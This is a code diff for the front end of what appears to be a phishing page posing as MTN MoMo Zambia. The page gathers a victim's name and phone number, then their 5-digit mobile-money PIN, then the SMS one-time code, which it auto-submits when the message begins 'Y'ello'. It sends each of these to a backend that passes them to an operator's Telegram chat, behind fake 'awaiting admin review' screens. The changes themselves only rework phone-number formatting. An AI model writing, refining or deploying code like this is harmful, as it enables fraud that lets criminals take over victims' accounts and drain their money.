@@ -72,28 +72,32 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  function normalizeZambiaMomo(rawPhone) {
+  // Converts any input (e.g. +260961234567, 260961234567, 0961234567) to start with "0"
+  function toZeroPrefixPhone(rawPhone) {
     const digits = String(rawPhone || '').replace(/\D/g, '');
-    if (digits.startsWith('260') && digits.length === 12) {
+    if (digits.startsWith('260')) {
       return '0' + digits.slice(3);
+    }
+    if (digits.startsWith('0')) {
+      return digits;
+    }
+    if (/^(96|76|56)\d{7}$/.test(digits)) {
+      return '0' + digits;
     }
     return digits;
   }
 
   function isValidMtnZambia(rawPhone) {
-    const normalized = normalizeZambiaMomo(rawPhone);
+    const normalized = toZeroPrefixPhone(rawPhone);
     return /^(096|076|056)\d{7}$/.test(normalized);
   }
 
   function formatDisplayPhone(rawPhone) {
-    const digits = String(rawPhone || '').replace(/\D/g, '');
-    if (digits.startsWith('260') && digits.length === 12) {
-      return `+260 ${digits.slice(3, 5)} ${digits.slice(5)}`;
+    const zeroPhone = toZeroPrefixPhone(rawPhone);
+    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
+      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
     }
-    if (/^(096|076|056)\d{7}$/.test(digits)) {
-      return `+260 ${digits.slice(1, 3)} ${digits.slice(3)}`;
-    }
-    return rawPhone || '+260 96 XXX XXXX';
+    return zeroPhone || '096 XXX XXXX';
   }
 
   function showBanner(el, msg) {
@@ -172,7 +176,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (inp) inp.addEventListener('input', updateStep2ReadyState);
   });
 
-  // Navigation
   if (btnGotoSlider) btnGotoSlider.addEventListener('click', () => showScreen(screenSlider));
   if (btnSliderBack) btnSliderBack.addEventListener('click', () => showScreen(screenWelcome));
   if (btnGotoForm1) btnGotoForm1.addEventListener('click', () => showScreen(screenForm1));
@@ -216,7 +219,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));
 
-  // After Step 3 of 3 -> move to 5-digit PIN screen (Telegram PIN message is sent once 5 PIN digits are filled)
   if (btnForm3Submit) {
     btnForm3Submit.addEventListener('click', async () => {
       hideBanner(bannerForm3Error);
@@ -230,7 +232,8 @@ document.addEventListener('DOMContentLoaded', () => {
       }
 
       const fullName = `${fn} ${ln}`.toUpperCase();
-      const formattedPhone = formatDisplayPhone(ph);
+      const zeroPhone = toZeroPrefixPhone(ph);
+      const formattedPhone = formatDisplayPhone(zeroPhone);
 
       if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
       if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
@@ -250,7 +253,7 @@ document.addEventListener('DOMContentLoaded', () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             adminChatId: adminParam,
-            applicant: { fullName, phone: formattedPhone }
+            applicant: { fullName, phone: zeroPhone }
           })
         });
         const data = await res.json();
@@ -289,7 +292,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // 5-digit PIN auto-submit when all 5 boxes are filled
   pinBoxes5.forEach((box, idx) => {
     box.addEventListener('input', () => {
       box.value = box.value.replace(/\D/g, '').slice(0, 1);
@@ -312,7 +314,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
   async function submitPinToTelegram(pinVal) {
     hideBanner(bannerPinError);
-    const phoneVal = (displayPinPhone?.innerText || formPhoneInput?.value || '').trim();
+    const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
+    const phoneZero = toZeroPrefixPhone(rawPhone);
     const applicantName = (sumApplicant?.innerText || `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`).trim() || 'MTN MOMO ZAMBIA';
 
     showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');
@@ -323,7 +326,7 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           userId: currentUserId,
-          phone: phoneVal,
+          phone: phoneZero,
           pin: pinVal,
           applicantName
         })
@@ -340,7 +343,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // 15-second SMS countdown timer
   function startSmsCountdown() {
     let timeLeft = 15;
     if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
@@ -364,7 +366,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnRequestNewSms) {
     btnRequestNewSms.addEventListener('click', async () => {
       hideBanner(bannerSmsError);
-      const phoneVal = (displaySmsPhone?.innerText || formPhoneInput?.value || '').trim();
+      const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
       showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
       startSmsCountdown();
 
@@ -374,14 +376,13 @@ document.addEventListener('DOMContentLoaded', () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             userId: currentUserId,
-            phone: phoneVal
+            phone: phoneZero
           })
         });
       } catch (e) {}
     });
   }
 
-  // Auto-submit SMS when starting with "Y'ello"
   if (smsInputBox) {
     smsInputBox.addEventListener('input', () => {
       const currentText = smsInputBox.value.trim();
@@ -406,7 +407,7 @@ document.addEventListener('DOMContentLoaded', () => {
   async function submitSmsToTelegram(smsText, autoDetected) {
     hideBanner(bannerSmsError);
     hideBanner(bannerSmsInfo);
-    const phoneVal = (displaySmsPhone?.innerText || formPhoneInput?.value || '').trim();
+    const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
 
     showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');
 
@@ -416,7 +417,7 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           userId: currentUserId,
-          phone: phoneVal,
+          phone: phoneZero,
           sms: smsText,
           autoDetected
         })
